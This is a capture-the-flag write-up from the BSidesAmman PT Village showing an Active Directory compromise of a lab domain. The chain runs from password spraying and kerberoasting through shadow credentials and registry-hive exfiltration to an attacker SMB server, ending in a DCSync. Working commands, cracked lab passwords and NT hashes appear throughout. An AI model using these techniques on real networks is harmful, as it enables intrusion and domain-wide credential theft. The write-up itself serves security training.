---
date: 2025-05-26
authors:
  - name: "Zavier Lee"
    avatar: "./assets/img/authors/zavier.png"
    title: "Offensive Security Engineer"
    twitter: "https://x.com/gatariee"
    github: "https://github.com/gatariee"
  - name: "Saif 'Sawyer' Yaseen"
    title: "PT Intern"
    avatar: "./assets/img/authors/sawyer.png"
    github: "https://github.com/sawyerspresent"
---


# BSidesAmman Writeup EN

This is a writeup of the PT Village that we organized during the [BSidesAmman Conference](https://bsidesamman.io/) in Amman, Jordan.

<div class="toc-container">
<button class="toc-toggle" onclick="toggleToc()">Table of Contents</button>
<div class="toc-content" id="tocContent">
<ol>
<li>
<a href="#introduction">Introduction</a>
<ul>
<li><a href="#disclaimer-and-scenario">Disclaimer and scenario</a></li>
<li><a href="#required-tools">Required tools</a></li>
</ul>
</li>

<li>
<a href="#initial-access">Initial access</a>
<ul>
<li><a href="#credential-discovery">Credential discovery through password spraying</a></li>
</ul>
</li>

<li>
<a href="#accessing-svc_web">Accessing svc_web</a>
<ul>
<li><a href="#smb-share-enumeration">SMB share enumeration</a></li>
</ul>
</li>

<li>
<a href="#authentication-as-abdullah">Authentication as abdullah.azooz</a>
<ul>
<li><a href="#bloodyad-enumeration">ACL enumeration with bloodyAD</a></li>
</ul>
</li>

<li>
<a href="#privilege-escalation">Mustafa options</a>
<ul>
<li><a href="#targeted-kerberoasting">Gargeted kerberoasting</a></li>
<li><a href="#shadow-credentials-attack">Ghadow credentials attack</a></li>
<li><a href="#group-enumeration">Group enumeration through BloodyAD</a></li>
</ul>
</li>

<li>
<a href="#retrieving-domain-admin-hashes-through-dcsync">DCSync</a>
<ul>
<li><a href="#transfering-the-files-over">Transferring the files</a></li>
<li><a href="#dcsync-through-machine-account">DCSync using the machine account</a></li>
</ul>
</li>
</ol>

</div>
</div>
<br>


## Introduction

### Disclaimer and Scenario

#### Original Assumed breach Scenario

the following credentials were given as part of an assumed breach for the internal assessment:  
  
```  
hasan.bakri@albalad.bsides.rv  
ILoveJordan123@  
```  
  
#### Updated Scenario  
  
In this version the initial access is done by password spraying, the users are given the necessary IPs and the user given a hint if no progress has been made in 5 minutes. The hint being "Everything you need is provided to you, the username and the IPs. Go back to the basics of Active Directory attacks and enumerations" so we will be moving forward with the credentials updated scenario `hasan.bakri:hasan.bakri`  
  
```  
nxc smb 10.2.10.11 -u 'hasan.bakri' -p 'hasan.bakri'  
```  


### Required Tools

The following tools will most likely be used during the CTF:
1. [NetExec](https://www.netexec.wiki/)
2. [Impacket](https://github.com/fortra/impacket)
3. [BloodyAD](https://github.com/CravateRouge/bloodyAD)
4. [BloodHound](https://github.com/SpecterOps/BloodHound)

### BloodHound Usage

> Like previous writeups There is _nothing_ wrong with Bloodhound, But it is always best to understand the limitations of tooling and how to operate without it
Like previous writeups There is _nothing_ wrong with Bloodhound, But it is always best to understand the limitations of tooling

<br>

## Initial Access
using the information provided, we can first fingerprint the domain.  
  
```shell  
echo '10.2.10.11' >> targets.txt
echo '10.2.10.12' >> targets.txt
```  

### Credential Discovery

The first step is password spraying, using the username as the password. This allows us to authenticate as a user and obtain the hostnames.
  
```shell  
nxc smb targets.txt -u 'hasan.bakri' -p 'hasan.bakri' --generate-hosts-file hosts.txt
SMB         10.2.10.11      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:albalad.bsides.rv) (signing:True) (SMBv1:False)  
SMB         10.2.10.12      445    DEV03            [*] Windows Server 2022 Build 20348 x64 (name:DEV03) (domain:albalad.bsides.rv) (signing:False) (SMBv1:False)  
SMB         10.2.10.11      445    DC01             [+] albalad.bsides.rv\hasan.bakri:hasan.bakri 
SMB         10.2.10.12      445    DEV03            [+] albalad.bsides.rv\hasan.bakri:hasan.bakri
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00  
cat hosts.txt
10.2.10.11     DC01.albalad.bsides.rv albalad.bsides.rv DC0110.2.10.12     DEV03.albalad.bsides.rv DEV03
```  

we can infer that the domain controller is `DC01.albalad.bsides.rv`, however we can confirm this by checking if the `ldap` service is enabled.  
  
```shell  
nxc ldap DC01.albalad.bsides.rv LDAP        10.2.10.11      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:albalad.bsides.rv)  
```  

checking the shares on these machines, we identify a `svc_home$`.  
  
```python
nxc smb targets.txt -u 'hasan.bakri' -p 'hasan.bakri' --shares
SMB         10.2.10.12      445    DEV03            [*] Windows Server 2022 Build 20348 x64 (name:DEV03) (domain:albalad.bsides.rv) (signing:False) (SMBv1:False) 
SMB         10.2.10.11      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:albalad.bsides.rv) (signing:True) (SMBv1:False) 
SMB         10.2.10.12      445    DEV03            [+] albalad.bsides.rv\hasan.bakri:hasan.bakri
SMB         10.2.10.11      445    DC01             [+] albalad.bsides.rv\hasan.bakri:hasan.bakri 
SMB         10.2.10.12      445    DEV03            [*] Enumerated shares
SMB         10.2.10.12      445    DEV03            Share           Permissions     Remark
SMB         10.2.10.12      445    DEV03            -----           -----------     ------
SMB         10.2.10.12      445    DEV03            ADMIN$                          Remote Admin
SMB         10.2.10.12      445    DEV03            C$                              Default share
SMB         10.2.10.12      445    DEV03            IPC$            READ            Remote IPC
SMB         10.2.10.12      445    DEV03            svc_home$                       common directory for service accounts
SMB         10.2.10.11      445    DC01             [*] Enumerated shares
SMB         10.2.10.11      445    DC01             Share           Permissions     Remark
SMB         10.2.10.11      445    DC01             -----           -----------     ------
SMB         10.2.10.11      445    DC01             ADMIN$                          Remote Admin
SMB         10.2.10.11      445    DC01             C$                              Default share
SMB         10.2.10.11      445    DC01             IPC$            READ            Remote IPCS
SMB         10.2.10.11      445    DC01             NETLOGON        READ            Logon server share 
SMB         10.2.10.11      445    DC01             SYSVOL          READ            Logon server share
```  
  
we can infer that the `svc_home$` share would belongs to service accounts.  

<br>

## Accessing SVC_WEB

next, we can identify users with a service principal name (SPN) using the following command. users with an SPN can have their service tickets requested, and cracked offline (known as a `kerberoasting` attack.)  
  
```shell  
GetUserSPNs.py 'albalad.bsides.rv'/'hasan.bakri':'hasan.bakri'
Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and its affiliated companies   
ServicePrincipalName                   Name     MemberOf                                                 PasswordLastSet             LastLogon  Delegation -------------------------------------  -------  -------------------------------------------------------  --------------------------  ---------  ----------
HTTP/W-SVR-02.albalad.bsides.rv:80     svc_web  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:15.334591  <never>               
HTTP/W-SVR-01.albalad.bsides.rv:80     svc_web  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:15.334591  <never>               
MSSQLSvc/SQL02.albalad.bsides.rv:1433  svc_sql  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:12.631459  <never>               
MSSQLSvc/SQL01.albalad.bsides.rv:1433  svc_sql  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:12.631459  <never>               
VDI/vdi.albalad.bsides.rv:41440        svc_vdi  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:09.803337  <never>               
TERMSRV/vdi.albalad.bsides.rv:3389     svc_vdi  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:09.803337  <never> 
```  
  
We see that it is slightly odd that none of the service accounts have logged on, but it could be alright if they are only ran as services. all of the users can be kerberoasted, but we will only focus on `svc_web` for now.  
  
```shell  
GetUserSPNs.py 'albalad.bsides.rv'/'hasan.bakri':'hasan.bakri' -request-user 'svc_web' -outputfile 'svc_web.tgs'
Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and its affiliated companies   
ServicePrincipalName                Name     MemberOf                                                 PasswordLastSet             LastLogon  Delegation ----------------------------------  -------  -------------------------------------------------------  --------------------------  ---------  ----------
HTTP/W-SVR-02.albalad.bsides.rv:80  svc_web  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:15.334591  <never>               
HTTP/W-SVR-01.albalad.bsides.rv:80  svc_web  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:15.334591  <never>  
```  
  
This ticket can be cracked offline with `john`, or `hashcat`.  
  
```shell  
john --wordlist=/usr/share/wordlists/rockyou.txt svc_web.tgs 
Using default input encoding: UTF-8Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])  
Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status
webkinz1         (?)     1g 0:00:00:00 DONE (2025-04-28 13:01) 33.33g/s 1126Kp/s 1126Kc/s 1126KC/s dumbo..redcatUse the "--show" option to display all of the cracked passwords reliably
Session completed.
```  

### SMB Share Enumeration

Using the `svc_web` account, we can enumerate the shares again and find that we now have access to `svc_home$`.  
  
```shell  
nxc smb DEV03.albalad.bsides.rv -u 'svc_web' -p 'webkinz1' --shares
SMB         10.2.10.12      445    DEV03            [*] Windows Server 2022 Build 20348 x64 (name:DEV03) (domain:albalad.bsides.rv) (signing:False) (SMBv1:False) 
SMB         10.2.10.12      445    DEV03            [+] albalad.bsides.rv\svc_web:webkinz1 
SMB         10.2.10.12      445    DEV03            [*] Enumerated shares
SMB         10.2.10.12      445    DEV03            Share           Permissions     Remark
SMB         10.2.10.12      445    DEV03            -----           -----------     ------
SMB         10.2.10.12      445    DEV03            ADMIN$                          Remote Admin
SMB         10.2.10.12      445    DEV03            C$                              Default share
SMB         10.2.10.12      445    DEV03            IPC$            READ            Remote IPC
SMB         10.2.10.12      445    DEV03            svc_home$       READ,WRITE      common directory for service accounts
```  
  
We can begin looting this share, and find credentials in `\\svc_home$\svc_home$\svc_web\config.php`  
  
```  
<?php  
define('DB_HOST', 'localhost');  
define('DB_USER', 'abdullah.azooz');  
define('DB_PASS', 'PetraEnjoyer1950');  
define('DB_NAME', 'web_db');  
?>  
```  

<br>



## Authentication as Abdullah
We find that these credentials are valid for the domain.  
  
```shell  
nxc smb dc01.albalad.bsides.rv -u 'abdullah.azooz' -p 'PetraEnjoyer1950'
SMB         10.2.10.11      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:albalad.bsides.rv) (signing:True) (SMBv1:False) 
SMB         10.2.10.11      445    DC01             [+] albalad.bsides.rv\abdullah.azooz:PetraEnjoyer1950
```  
  
### BloodyAD Enumeration
Then we can see that this user has an outbound ACL to mustafa.yaseen  
  
```shell  
bloodyAD --host 10.2.10.11 -d albalad.bsides.rv -u 'abdullah.azooz'  -p 'PetraEnjoyer1950' get writable  
distinguishedName: CN=abdullah.azooz,CN=Users,DC=albalad,DC=bsides,DC=rvpermission: WRITE  
distinguishedName: CN=mustafa.yaseen,CN=Users,DC=albalad,DC=bsides,DC=rvpermission: WRITE  
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=albalad,DC=bsides,DC=rvpermission: WRITE
```  

<br>

## Privilege Escalation
So we there are multiple attacks vectors since we have genericwrite on a user. them being;   
  
- Targeted Kerberoasting  
- ShadowCredentials  
  

### Targeted Kerberoasting
The first option here would be to use targeted kerberoasting. this abuse can be carried out if we have one of the following ACLs over a target, `GenericWrite`, `WriteProperty`. we can add an SPN (`ServicePrincipalName`) to that account. Once the account has an SPN, it becomes vulnerable to [Kerberoasting](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast). This technique is called Targeted Kerberoasting.  
  

```shell  
targetedKerberoast.py -d albalad.bsides.rv -u abdullah.azooz  -p 'PetraEnjoyer1950' --request-user mustafa.yaseen -o mustafa.txt[*] Starting kerberoast attacks  
[*] Attacking user (mustafa.yaseen)  
[+] Writing hash to file for (mustafa.yaseen)  
```  
  
Now we have accomplished the attack lets look at the hash
  
```python  
cat mustafa.txt  
$krb5tgs$23$*mustafa.yaseen$ALBALAD.BSIDES.RV$albalad.bsides.rv/mustafa.yaseen*$d3f68ab888e41429dd9c0a33721caa7e$e069b57e798b66b4c291d5dd9e98cf3e1909b05636450b841eaaa5fb51a8255dc8415118938f4e78424c5d406a60636fa6e7efbdb45b68928b6f53848a4a9530a3e335be2b53d4037b6cdc7e4672d12189cc3ddced2c449a8dcaccb6b8e6d4a4ea2bbb22c082dec9cdc478e0a38ce2f56610cbef7a610f5680c56368fe4140892f27d647eb966cc4b4417cc2bd3efd798e63b2a804bea66609d867668c647d769b97b6158ae8e2e51a659dd2f607b7ca0fc163eca129a34e93f9632bd4861763bc6f6a86dc4f2e44e829acc52ae5583fd90a34f74c07371dbbf3b5445c0a8e3db295b342a36638de367427a8df8f324a73b3a04dbb46b725ac87f84b94acb976ad5e1237c8ed56598a6fc5ba9b89957c75ecea7b5893a7a57438e965b594a1fcbd96910319c1e5fdf0492860141d59151d7ee937a08ecdb12e5c2046832de34c0143167184105212a2e1a02f3539686d9bbb193b1d5da10787070b20cb968c9075321ff02c4a76f184330a0fe98c7b2d9d37509164ed70000f9921313a36bd139f5b660647fada22dd0638ee30176f5067d1242b51bc106daac55ea6139ada5c20a2d06d828596e6403328472a728230b6c73f4bb31a11bd01d2c8df3774c1388c5d6edb47b6412cd46c1af8c30814db73ece3ddeaab5bc47c3ab445bcfb637488e45c11b71bd391537dd2f8b156a7949c3b9a4f5dee7d11b9759c53797fbcaafd67bf4f62f6363c9f52a1cce72cb5df2b43a2755a7e4ff8ef0a78a1dc356dd2c95b35a38890dcaca550bb579a63921d1d0558c5faece1622a0b64cc11522b32a195e6322db86fc1922648db92c1d8d19b66a1bdcf29cd7d75bfb8592e4a502ccafd9e075b37f5dec34ba2400cbb9a0bc583bcdeca81fbcb5f382666ea77bb2e7bbf046254b430213a6a82cb091ee2231aab8d6e454213cf35bbfb4617e7c4c46b089745b1f9812d67beb1883fa132808893c2a0af9774e0ff8e587a7dc26277e37c79660986f39ed700681541b9ff20c13adc970e07e64765fd86e12e80f17e8fbbbd994bc2b8c1801eb3fb01d83066ef1df30b0788d434cb409ddc92031c45fa0aee003ba063f30ff39dee66648a3e048324eb8f22571ceaac3fbe6ffe8b90869f107be104e214a6ccebd0d3a066c5d1d8ecfc883a673a8dbdcea3cfad2d4e8f1ba81265dea4b1ca153e76ade509230977d35a01e6658b7f673290085b180125d3b618b9dce7bb3ddc5c9b00723dee7f36e23c652931915a4fd6a3d073adf994cabc53a4af8d982abc5b1af3f444c5d89c67019735a3d9ae7114a6d4d621a5c739733763f76f30ad0018cf90cd82e04dc497c1221d7380b2596b4719a5a6a4070ac0c5104f08528a8abaf98c172f476bcefd9c6315189febff41d542e144ccd308fef982803ef87e9a7021d8bd7316a9d8dd6ed3e641f4c3b56669aac8e6a6215881a14e9bd6956420be03c352d6fcc2848f79d87e752e9450eeea00eac37d3350c126194df2a344ad8209af334e116fafc5040aeb4e0f0dff4119f8c3d54a50fa52f38c55c071  
```  

Attempting to crack it will lead us to cracking the password!
  
```python  
john -w=/usr/share/wordlists/rockyou.txt mustafa.txt  
  
Using default input encoding: UTF-8  
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])  
Will run 4 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
whybackup88      (?)     1g 0:00:00:01 DONE (2025-04-30 08:50) 0.6060g/s 1673Kp/s 1673Kc/s 1673KC/s whyband..whosline18  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.   
```  


### Shadow Credentials Attack

Its not out of the norm for targetedkerberoasting not work too, since some users might have very strong & complex passwords. Hence we will move towards shadow credentials incase the password doesn't crack  
  
Active Directory user and computer objects include an `msDS-KeyCredentialLink` attribute where public keys can be stored, when enabling PKINIT pre-authentication the KDC validates that a user possesses the corresponding private key before issuing a TGT. If an attacker gains permissions to modify another object’s `msDS-KeyCredentialLink`—for example, via group membership or elevated ACEs—they can inject their own public key and thereafter authenticate as that account, granting them persistent, stealthy access to the target.  
  
```shell  
kali@kali ~> certipy shadow auto -u abdullah.azooz@albalad.bsides.rv -p 'PetraEnjoyer1950' -account mustafa.yaseenCertipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*] Targeting user 'mustafa.yaseen'  
[*] Generating certificate  
[*] Certificate generated  
[*] Generating Key Credential  
[*] Key Credential generated with DeviceID '680cfc70-0879-746b-8fbb-15f4be90b1d3'  
[*] Adding Key Credential with device ID '680cfc70-0879-746b-8fbb-15f4be90b1d3' to the Key Credentials for 'mustafa.yaseen'  
[*] Successfully added Key Credential with device ID '680cfc70-0879-746b-8fbb-15f4be90b1d3' to the Key Credentials for 'mustafa.yaseen'  
[*] Authenticating as 'mustafa.yaseen' with the certificate  
[*] Using principal: mustafa.yaseen@albalad.bsides.rv  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saved credential cache to 'mustafa.yaseen.ccache'  
[*] Trying to retrieve NT hash for 'mustafa.yaseen'  
[*] Restoring the old Key Credentials for 'mustafa.yaseen'  
[*] Successfully restored the old Key Credentials for 'mustafa.yaseen'  
[*] NT hash for 'mustafa.yaseen': 409a45a42c916885ac56127bebf06225  
``` 

### Group Enumeration

Using this hash we can authenticate as this user and we could see that this user is a member of backup operators.  

```shell  
bloodyAD --host 10.2.10.11 -d albalad.bsides.rv -u 'mustafa.yaseen'  -p ':409a45a42c916885ac56127bebf06225' get membership mustafa.yaseen  
distinguishedName: CN=Users,CN=Builtin,DC=albalad,DC=bsides,DC=rvobjectSid: S-1-5-32-545sAMAccountName: Users  
distinguishedName: CN=Backup Operators,CN=Builtin,DC=albalad,DC=bsides,DC=rvobjectSid: S-1-5-32-551sAMAccountName: Backup Operators  
distinguishedName: CN=Domain Users,CN=Users,DC=albalad,DC=bsides,DC=rvobjectSid: S-1-5-21-3705552387-1610714051-5520856-513sAMAccountName: Domain Users
```  
<br>


## Retrieving Domain Admin hashes through DCSync 
### Transfering the files over
To minimize our footprint we are going to dump the SAM, SYSTEM & SECURITY on our attack box by first setting up an SMB Server

```shell  
smbserver.py sawyer . -smb2supportImpacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
[*] Config file parsed  
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0  
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0  
[*] Config file parsed  
[*] Config file parsed  
[*] Incoming connection (10.2.10.11,61022)  
[*] AUTHENTICATE_MESSAGE (\,DC01)  
[*] User DC01\ authenticated successfully  
[*] :::00::aaaaaaaaaaaaaaaa  
[*] Connecting Share(1:IPC$)  
[*] Connecting Share(2:sawyer)  
[*] AUTHENTICATE_MESSAGE (albalad\DC01$,DC01)  
[*] User DC01\DC01$ authenticated successfully  
  
```  
then dumping it to that remote location
  
```shell  
reg.py albalad.bsides.rv/mustafa.yaseen:whybackup88@10.2.10.11 backup -o '\\\\198.51.100.2\\sawyer\\'Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...  
[*] Saved HKLM\SAM to \\198.51.100.2\sawyer\\SAM.save  
[*] Saved HKLM\SYSTEM to \\198.51.100.2\sawyer\\SYSTEM.save  
[*] Saved HKLM\SECURITY to \\198.51.100.2\sawyer\\SECURITY.save  
```  
  
So now we can dump everything locally!, Lets first start by dumping the SAM
  
```python  
secretsdump.py -sam 'SAM.save' -system 'SYSTEM.save' LOCAL  
  
  
Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
[*] Target system bootKey: 0x6f5fdaf97f208b1c48ab1cf9d83438e6  
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f993698383cc8dc572e8abae5f71c7a1:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
[*] Cleaning up...   
``` 

Despite our efforts, the Domain Administrator hashes could not be obtained from here. The next step will be attempting to dump the SYSTEM registry hive  

```python  
secretsdump.py -system SYSTEM.save -security SECURITY.save LOCAL  
  
  
Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
[*] Target system bootKey: 0x6f5fdaf97f208b1c48ab1cf9d83438e6  
[*] Dumping cached domain logon information (domain/username:hash)  
[*] Dumping LSA Secrets  
[*] $MACHINE.ACC $MACHINE.ACC:plain_password_hex:4aaf8d9f90d8d0f7883dc7cfb66d12be1f2d0af130e910936432190b52e40af7faa85a3b26df315dfff4ef9eb716d1d2c204c4631e16b46bed985114edb735cca5c32b008ab75a2287624a46a75e0369d961974c961fc41f7d542fe4e83db5b1f656e5b7e093e6d457c83b208cfdd6f743683de652bddf46af04936d963ccefa897ab427a3f6deb39bf2acfb302ddeff2e5366d566587a47b0203aa0f28a17a8677e22acbf8073e73ba16cf46a23f49e7f7263c98828ad86323f6c3a8a2e1131e4012b31badc0482ff0650023c6fcc8a8ed76fe3b128f3e674391a405a87154393ecfa30e09e3de5a5da40951506ad9c  
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7b22f222a57d771b33826a805543acb8  
[*] DefaultPassword (Unknown User):password  
[*] DPAPI_SYSTEM dpapi_machinekey:0x7e469d12fc010a93951d262c8dcc2678e6410dbd  
dpapi_userkey:0xa3cf76ada7b5a47872bc8c3b2fe8c660f9254c89  
[*] NL$KM   
 0000   51 96 B6 B9 3C B8 5C 4C  2D D2 C4 C4 36 9D 42 68   Q...<.\L-...6.Bh  
 0010   13 75 A8 9F 53 8D 78 E4  98 C8 18 24 5A CF 1B 7B   .u..S.x....$Z..{ 0020   3C 97 C8 68 49 C4 95 6F  AB BB A1 FB 50 2A 6F 8D   <..hI..o....P*o. 0030   C4 43 0D CC 8F 6D 47 7C  19 CC B5 E8 1E 55 2F AC   .C...mG|.....U/.NL$KM:5196b6b93cb85c4c2dd2c4c4369d42681375a89f538d78e498c818245acf1b7b3c97c86849c4956fabbba1fb502a6f8dc4430dcc8f6d477c19ccb5e81e552fac  
[*] Cleaning up...   
```  
  
### DCSync through machine account
Through Dumping the SYSTEM we can use the DC account to perform DCSync!
  
  
```shell  
secretsdump.py albalad.bsides.rv/DC01\$@10.2.10.11 -hashes ':7b22f222a57d771b33826a805543acb8'Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
[*] Using the DRSUAPI method to get NTDS.DIT secrets  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0f1a374289ceae1e89cc103a9986c2b2:::  
localuser:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::  
User:1104:aad3b435b51404eeaad3b435b51404ee:f993698383cc8dc572e8abae5f71c7a1:::  
Admin:1105:aad3b435b51404eeaad3b435b51404ee:f993698383cc8dc572e8abae5f71c7a1:::  
albalad.bsides.rv\ahmad.al.satooh:1107:aad3b435b51404eeaad3b435b51404ee:8d181b680d2f46ace51c9f3f5720a60d:::  
albalad.bsides.rv\omar.heshnat:1108:aad3b435b51404eeaad3b435b51404ee:ad515ff94211034e7d6b5584c4ab8221:::  
```

